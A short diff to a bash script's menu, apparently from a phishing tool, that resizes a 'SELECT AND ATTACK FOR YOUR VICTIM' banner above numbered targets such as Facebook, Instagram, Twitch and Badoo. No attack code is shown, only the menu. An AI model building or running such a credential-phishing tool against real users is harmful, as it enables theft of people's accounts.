@@ -109,9 +109,10 @@ printf "\e[0m\n"
 
 menu() {
 
-echo -e "######################################" | lolcat
-echo -e "#   SELECT AND ATTACK FOR YOUR VICTIM#" | lolcat
-echo -e "######################################" | lolcat
+
+echo -e "#########################################################" | lolcat
+echo -e "#      SELECT AND ATTACK FOR YOUR VICTIM #" | lolcat
+echo -e "#########################################################" | lolcat
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[0m\e[96m Facebook    \e[0m\e[1;31m[\e[0m\e[1;77m11\e[0m\e[1;31m]\e[0m\e[0m\e[96m Twitch      \e[0m\e[1;31m[\e[0m\e[1;77m21\e[0m\e[1;31m]\e[0m\e[0m\e[96m DeviantArt\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[0m\e[96m Instagram   \e[0m\e[1;31m[\e[0m\e[1;77m12\e[0m\e[1;31m]\e[0m\e[0m\e[96m Pinterest   \e[0m\e[1;31m[\e[0m\e[1;77m22\e[0m\e[1;31m]\e[0m\e[0m\e[96m Badoo\e[0m\n"
